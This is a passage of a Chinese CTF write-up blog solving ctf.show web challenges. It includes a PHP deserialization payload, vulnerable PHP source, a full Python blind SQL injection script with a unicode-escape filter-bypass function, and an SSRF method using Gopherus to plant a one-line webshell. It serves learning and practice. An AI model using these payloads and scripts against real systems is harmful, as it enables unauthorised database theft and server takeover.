class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>然后出现10-0就说明成功 用admin&#x2F;1就可以登录了</p>
<h1 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h1><p><img src="https://pic1.imgdb.cn/item/67ac664dd0e0a243d4fe994a.png" alt="|500"><br>题目又是一个登录界面，注册个账号看看.但是点注册跳转到的是qq的注册地址,而且又是一个代码审计题目<br>在网址输入&#x2F;<a target="_blank" rel="noopener" href="http://www.zip就可以下载源文件,扫描之后发现网站还有一个admin.目录/">www.zip就可以下载源文件,扫描之后发现网站还有一个admin.目录</a><br>在member.php中存在sql注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_CRONLITE&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$islogin</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;islogin&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;login_data&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$login_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login_data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$admin_user</span> = <span class="variable">$login_data</span>[<span class="string">&#x27;admin_user&#x27;</span>];</span><br><span class="line">            <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$udata</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$login_data</span>[<span class="string">&#x27;admin_pass&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;admin_user&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$admin_user</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_user&#x27;</span>]);</span><br><span class="line">            <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">            <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$_SESSION</span>[<span class="string">&quot;admin_pass&quot;</span>]) &#123;</span><br><span class="line">                <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>当查询返回的用户名为空且密码错误时，进行四次 setcookie 操作 当查询返回的用户名为不为空时，进行两次 setcookie 操作<br>大佬的脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://662305d4-5c5b-490d-bedf-dbc29ead878a.challenge.ctf.show/admin/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;\\u0075&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\u0027&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\u006f&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;\\u0069&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\u0022&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0020&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;\\u0073&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\u0023&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\u003e&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;\\u003c&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\\u002d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\\u003d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1a9&#x27;</span>, <span class="string">&#x27;F1a9&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#get database length</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">databaseName_len</span>():</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&quot;start get database name length...&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">45</span>):</span><br><span class="line">		payload = <span class="string">&quot;1&#x27; or (length(database())=&quot;</span> + <span class="built_in">str</span>(l+<span class="number">1</span>) + <span class="string">&quot;)#&quot;</span></span><br><span class="line">		payload = tamper(payload)</span><br><span class="line">		tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">		headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">		r =requests.get(url, headers=headers)</span><br><span class="line">		myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">		<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">1</span>)):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;get db length = &#x27;</span> + <span class="built_in">str</span>(l).lower())</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">			</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_databaseName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (database()) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;databasename = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tableName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;tablename = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ColumnName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select column_name from information_schema.columns where table_name=&#x27;FL2333G&#x27; limit 0,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;column name = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select FLLLLLAG from FL2333G) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;flag = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;start database sql injection...&quot;</span>)</span><br><span class="line">databaseName_len()</span><br><span class="line">get_databaseName()</span><br><span class="line">get_tableName()</span><br><span class="line">get_ColumnName()</span><br><span class="line">get_value()</span><br></pre></td></tr></table></figure></div>
<h1 id="红包题第九弹"><a href="#红包题第九弹" class="headerlink" title="红包题第九弹"></a>红包题第九弹</h1><p><img src="https://pic1.imgdb.cn/item/67ac669fd0e0a243d4fe9960.png" alt="|425"><br>给了一个登录界面，点击login会跳到一个check.php,随便写用户名和密码，发现有给一个reurl参数<br>所以猜测有ssrf<br><img src="https://pic1.imgdb.cn/item/67ac66afd0e0a243d4fe996e.png"><br>这里使用ssrf专用的工具Gopherus <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br>我用的kali安装，修改了一下install.sh </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">python3 -m pip install argparse --break-system-packages</span><br><span class="line">python3 -m pip install requests --break-system-packages</span><br><span class="line"><span class="built_in">chmod</span> +x gopherus.py</span><br><span class="line"><span class="built_in">ln</span> -sf $(<span class="built_in">pwd</span>)/gopherus.py /usr/local/bin/gopherus</span><br></pre></td></tr></table></figure></div>
<p>然后写入一句话木马<br><img src="https://pic1.imgdb.cn/item/67ac6865d0e0a243d4fe9a42.png"><br>得到poc,把poc做个url编码，然后用bp发送<br><img src="https://pic1.imgdb.cn/item/67ac67b0d0e0a243d4fe9a10.png"><br>用蚁剑连接之后在根目录找到flag<br><img src="https://pic1.imgdb.cn/item/67ac6855d0e0a243d4fe9a3c.png" alt="|475"></p>
<h1 id="红包题-葵花宝典"><a href="#红包题-葵花宝典" class="headerlink" title="红包题 葵花宝典"></a>红包题 葵花宝典</h1><p><img src="https://pic1.imgdb.cn/item/67ac6846d0e0a243d4fe9a38.png" alt="|525"><br>又是一个登录平台<br>注册之后登录直接拿到flag<br><img src="https://pic1.imgdb.cn/item/67ac6867d0e0a243d4fe9a43.png"></p>
<h1 id="红包题-辟邪剑谱"><a href="#红包题-辟邪剑谱" class="headerlink" title="红包题 辟邪剑谱"></a>红包题 辟邪剑谱</h1><p>和上一题一样的登录界面,但是注册之后不能登录。在url中访问<a target="_blank" rel="noopener" href="http://www.zip可以下载源代码/">www.zip可以下载源代码</a><br>checklogin.php代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">?</span>php</span><br><span class="line">    require_once &#x27;<span class="operator">/</span>inc<span class="operator">/</span>inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">    $user_name <span class="operator">=</span> trim($_POST[&#x27;user_name&#x27;]);</span><br><span class="line">    $user_password <span class="operator">=</span> trim($_POST[&#x27;user_password&#x27;]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\\</span>$|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\（</span>|<span class="char escape_">\）</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\,</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $user_name)) &#123;</span><br><span class="line">        die(<span class="string">&quot;stop hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\\</span>$|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\（</span>|<span class="char escape_">\）</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\,</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $user_password)) &#123;</span><br><span class="line">        die(<span class="string">&quot;stop hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data <span class="operator">=</span> $db<span class="operator">-&gt;</span>select(<span class="string">&quot;admin&quot;</span>, [<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>], [<span class="string">&quot;username[=]&quot;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    foreach ($data as $d) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($d[&#x27;password&#x27;] <span class="operator">==</span><span class="operator">=</span> $user_password) &#123;</span><br><span class="line">            $_SESSION[&#x27;user&#x27;] <span class="operator">=</span> $user_name;</span><br><span class="line">            die(<span class="string">&quot;login success!&lt;br&gt;&lt;hr&gt;flag is $flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="operator">?</span><span 